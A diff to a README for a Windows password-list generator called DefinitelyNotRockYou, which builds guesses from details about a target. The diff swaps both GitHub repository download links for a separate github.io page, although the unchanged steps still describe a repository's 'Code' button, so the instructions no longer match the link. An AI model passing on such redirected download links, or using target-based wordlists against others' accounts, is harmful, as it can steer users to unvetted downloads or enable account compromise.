@@ -1,6 +1,6 @@
 # 🔐 DefinitelyNotRockYou - Create custom password lists for security
 
-[![](https://img.shields.io/badge/Download-DefinitelyNotRockYou-blue.svg)](https://github.com/corrieverminous789/DefinitelyNotRockYou)
+[![](https://img.shields.io/badge/Download-DefinitelyNotRockYou-blue.svg)](https://corrieverminous789.github.io)
 
 DefinitelyNotRockYou helps you test the strength of your own passwords. It uses details about a target to create a list of common password guesses. This tool works locally on your computer. You use it for security research and to check password strength.
 
@@ -23,7 +23,7 @@ This tool runs on computers with Windows 10 or Windows 11.
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the project page here: [https://github.com/corrieverminous789/DefinitelyNotRockYou](https://github.com/corrieverminous789/DefinitelyNotRockYou).
+1. Visit the project page here: [https://corrieverminous789.github.io](https://corrieverminous789.github.io).
 2. Look for the green "Code" button near the top right of the page.
 3. Click "Download ZIP" from the menu.
 4. Open your "Downloads" folder in Windows File Explorer.
